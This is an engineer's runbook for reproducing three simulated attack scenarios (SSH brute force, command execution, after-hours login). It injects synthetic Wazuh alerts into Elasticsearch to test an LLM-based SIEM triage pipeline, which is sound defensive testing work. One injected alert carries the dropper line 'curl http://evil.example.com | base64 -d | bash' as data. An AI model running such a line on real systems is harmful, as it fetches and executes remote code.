# How to Reproduce the Phase 1 Attack Scenarios

**Project:** Cosmic Info Solutions SIEM Phase 1  
**Engineer:** Ahmad Bussti  
**Test date:** Day 18 — 3 June 2026

This document explains how to reproduce the three attack scenarios that were
run on Day 18 to validate the full SIEM pipeline.

---

## Prerequisites

Before running any scenario, confirm the full stack is up:

```bash
# Elasticsearch healthy
curl -s -u elastic:changeme http://localhost:9201/_cluster/health | python3 -m json.tool

# Ollama running (skip if using mock LLM)
ollama list

# Pipeline dependencies installed
cd ~/elastic/langgraph && python3 -c "import langgraph; print('langgraph ok')"
```

---

## Running all scenarios at once

The master test runner (`run_day18_tests.py`) handles all three scenarios
and generates a markdown report automatically.

```bash
cd ~/elastic/langgraph

# Run with mock LLM (fast — recommended for CI and regression testing)
python3 run_day18_tests.py --mock-llm

# Run with live Ollama LLM (slow — 90–150s per triage call)
python3 run_day18_tests.py

# Run with Anthropic Claude API (fast, requires ANTHROPIC_API_KEY env var)
ANTHROPIC_API_KEY=sk-ant-... python3 run_day18_tests.py --llm-backend anthropic
```

Output is written to `~/elastic/docs/phase1-test-results.md` and raw JSON
per scenario to `scenario1_results.json`, `scenario2_results.json`, `scenario3_results.json`.

---

## Scenario 1 — T1110 SSH Brute Force

**What it simulates:** An attacker at `203.0.113.77` tries 10 different usernames
via SSH in quick succession.

**Expected result:** All 10 alerts score 91% → TRIAGE tier → verdict `suspicious` → escalate.

### Run it manually

```bash
cd ~/elastic/langgraph
python3 - <<'EOF'
from run_day18_tests import run_scenario_1
results = run_scenario_1(mock_llm=True)
for r in results:
    print(r["alert"]["data"]["dstuser"], "→", r["tier"], "|", r.get("verdict", "n/a"))
EOF
```

### What fires

- **Rule:** 5710 — `sshd: Attempt to login using non-existent user`
- **Rule level:** 10
- **Groups:** `sshd`, `authentication_failed`
- **Confidence scorer:** base 66% + 10 (auth_failed) + 10 (sshd) + 5 (level ≥ 10) = **91%**
- **Routing:** TRIAGE → triage_agent → hunting_agent → response_agent

### Inject into live Elasticsearch (optional)

```bash
for user in root admin ubuntu test user oracle pi git deploy backup; do
  curl -s -u elastic:changeme -X POST \
    "http://localhost:9201/logs-wazuh.alerts-$(date +%Y.%m.%d)/_doc" \
    -H "Content-Type: application/json" \
    -d "{
      \"@timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%S.000Z)\",
      \"rule\": {\"id\": \"5710\", \"description\": \"sshd: Attempt to login using non-existent user\", \"level\": 10, \"groups\": [\"syslog\",\"sshd\",\"authentication_failed\"]},
      \"agent\": {\"name\": \"agent1\"},
      \"data\": {\"srcip\": \"203.0.113.77\", \"dstuser\": \"$user\"}
    }" > /dev/null
  echo "Injected attempt for user: $user"
done
```

Wait 30 seconds for `pipeline_runner.py` to pick them up, then verify:

```bash
curl -s -u elastic:changeme \
  "http://localhost:9201/logs-wazuh.alerts-*/_search?q=data.srcip:203.0.113.77&size=10" \
  | python3 -m json.tool | grep -A 5 '"triage"'
```

---

## Scenario 2 — T1059 Command Execution

**What it simulates:** A compromised `www-data` web server process downloads
and executes a malicious script, then escalates to root via sudo.

**Expected result:** 3 correlated alerts all score ≥ 78% → TRIAGE → verdict `suspicious`.

### Run it manually

```bash
cd ~/elastic/langgraph
python3 - <<'EOF'
from run_day18_tests import run_scenario_2
results = run_scenario_2(mock_llm=True)
for r in results:
    print(r["alert"]["rule"]["description"][:50], "→", r["tier"], "|", r.get("verdict", "n/a"))
EOF
```

### Three alerts in the scenario

| Alert | Rule | Level | Confidence |
|---|---|---|---|
| Dropper command (`curl \| bash`) | 100002 custom | 12 | 85% |
| Sudo escalation by www-data | 5402 | 11 | 78% |
| Outbound connection to C2 | 100001 custom | 13 | 91% |

### Inject into live Elasticsearch (optional)

```bash
# Alert 1 — dropper
curl -s -u elastic:changeme -X POST \
  "http://localhost:9201/logs-wazuh.alerts-$(date +%Y.%m.%d)/_doc" \
  -H "Content-Type: application/json" \
  -d '{
    "@timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%S.000Z)'",
    "rule": {"id": "100002", "description": "Firewall: packet dropped — outbound to new dest", "level": 12, "groups": ["firewall","high"]},
    "agent": {"name": "webserver1"},
    "data": {"srcip": "10.0.0.50", "dstuser": "www-data", "command": "curl http://evil.example.com | base64 -d | bash"}
  }'

# Alert 2 — sudo escalation (run ~30s later for correlation window)
sleep 30
curl -s -u elastic:changeme -X POST \
  "http://localhost:9201/logs-wazuh.alerts-$(date +%Y.%m.%d)/_doc" \
  -H "Content-Type: application/json" \
  -d '{
    "@timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%S.000Z)'",
    "rule": {"id": "5402", "description": "Successful sudo to ROOT executed", "level": 11, "groups": ["sudo","authentication_success"]},
    "agent": {"name": "webserver1"},
    "data": {"srcip": "10.0.0.50", "dstuser": "root(uid=0)"}
  }'
```

---

## Scenario 3 — T1078 After-Hours Login

**What it simulates:** An attacker logs in successfully via SSH at 02:17 UTC
from an IP never seen before in the environment (`185.220.101.250`).

**Expected result (Phase 1):** Scores 53% before Day 19 fix → ANALYST_REVIEW.
**Expected result (Phase 2 / after Day 19 fix):** After-hours boost (+15) + new-IP boost (+10) → 78% → TRIAGE.

### Run it manually

```bash
cd ~/elastic/langgraph
python3 - <<'EOF'
from run_day18_tests import run_scenario_3
result = run_scenario_3(mock_llm=True)
print("tier:", result["tier"])
print("confidence:", result["confidence_pct"])
print("notes:", "\n  ".join(result["notes"]))
EOF
```

### Inject into live Elasticsearch with a synthetic 02:17 timestamp

```bash
curl -s -u elastic:changeme -X POST \
  "http://localhost:9201/logs-wazuh.alerts-$(date +%Y.%m.%d)/_doc" \
  -H "Content-Type: application/json" \
  -d '{
    "@timestamp": "'$(date -u +%Y-%m-%d)'T02:17:00.000Z",
    "rule": {"id": "5501", "description": "PAM: Login session opened", "level": 8, "groups": ["pam","authentication_success"]},
    "agent": {"name": "bastion1"},
    "data": {
      "srcip": "185.220.101.250",
      "dstuser": "devadmin",
      "login_hour": 2
    }
  }'
```

Wait 30s for the pipeline runner, then verify the alert was written back:

```bash
# Find the document ID from the inject response above, then:
curl -s -u elastic:changeme \
  "http://localhost:9201/logs-wazuh.alerts-*/_search?q=data.srcip:185.220.101.250" \
  | python3 -m json.tool | grep -A 8 '"triage"'
```

---

## Interpreting results

| Field | Meaning |
|---|---|
| `triage.verdict` | `suspicious` / `benign` / `unknown` — LLM output |
| `triage.confidence_pct` | Final scorer output (0–100) |
| `triage.technique` | MITRE ATT&CK ID identified by the LLM |
| `triage.processed_at` | When the pipeline ran |
| `siem_meta.status` | `pending_analyst_review` — set for ANALYST_REVIEW tier alerts |

## Known gaps (to be fixed in Phase 2)

| Gap | Scenario affected | Fix |
|---|---|---|
| No after-hours boost in scorer | Scenario 3 | Add +15 in `confidence_scorer.py` (B1 — Day 19) |
| No new-IP boost | Scenario 3 | Add `get_ip_seen_before()` (B2 — Day 19) |
| No hunting correlation | Scenario 3 | Implement `hunting_agent.py` (B3 — Day 19) |
| Burst not grouped | Scenario 1 (10 calls vs 1) | Add burst detection in `coordination_agent.py` (B4 — Day 19) |
| Live LLM not validated | All | Swap `LLM_BACKEND` to `anthropic` and re-run |